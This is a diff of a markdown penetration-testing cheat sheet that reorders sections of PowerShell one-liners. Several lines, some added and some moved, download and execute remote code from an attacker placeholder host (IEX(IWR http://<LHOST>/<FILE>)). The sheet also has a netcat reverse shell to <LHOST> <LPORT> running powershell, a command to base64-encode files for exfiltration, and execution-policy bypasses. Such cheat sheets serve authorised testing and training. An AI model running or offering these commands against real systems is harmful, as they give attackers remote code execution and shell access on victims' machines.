@@ -688,8 +688,10 @@ PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE>
 ```c
 PS C:\> iwr <LHOST>/<FILE> -o <FILE>
 PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
-PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
-PS C:\> IEX(IWR http://<LHOST>/<FILE>) -useb)
+PS C:\> iwr <LHOST>/<FILE> -o <FILE> -UseBasicParsing
+PS C:\> IEX(IWR http://<LHOST>/<FILE>)
+PS C:\> IEX(IWR http://<LHOST>/<FILE>) -useb
+PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 ```
 
 ### FTP Server
@@ -4008,6 +4010,24 @@ ipmo    // Import-Module
 PS C:\> Get-Help <COMMAND>
 ```
 
+#### Search for Files
+
+```c
+PS C:\> type <FILE> | findstr /l <STRING>
+```
+
+#### Create Base64 Blob of a File
+
+```c
+PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
+```
+
+#### Import Module to PowerShell cmdlet
+
+```c
+PS C:\> Import-Module .\<FILE>
+```
+
 #### Create a .zip File
 
 ```c
@@ -4020,22 +4040,18 @@ PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPat
 PS C:\> Expand-Archive -Force <FILE>.zip
 ```
 
-#### Search for Files
-
-```c
-PS C:\> type <FILE> | findstr /l <STRING>
-```
-
 #### Start a new Process
 
 ```c
 PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
 ```
 
-### Import Module to PowerShell cmdlet
+#### Check PowerShell Versions
 
 ```c
-PS C:\> Import-Module .\<FILE>
+PS C:\> Set-ExecutionPolicy Unrestricted
+PS C:\> powershell -Command "$PSVersionTable.PSVersion"
+PS C:\> powershell -c "[Environment]::Is64BitProcess"
 ```
 
 #### Check Execution Policy
@@ -4044,7 +4060,7 @@ PS C:\> Import-Module .\<FILE>
 PS C:\> Get-ExecutionPolicy
 ```
 
-#### Allow Script Execution
+##### Allow Script Execution
 
 ```c
 PS C:\> Set-ExecutionPolicy remotesigned
@@ -4052,15 +4068,7 @@ PS C:\> Set-ExecutionPolicy unrestricted
 PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 ```
 
-### Check PowerShell Versions
-
-```c
-PS C:\> Set-ExecutionPolicy Unrestricted
-PS C:\> powershell -Command "$PSVersionTable.PSVersion"
-PS C:\> powershell -c "[Environment]::Is64BitProcess"
-```
-
-### Script Execution Bypass
+##### Script Execution Bypass
 
 ```c
 PS C:\> powershell -ex bypass -File <FILE>.ps1
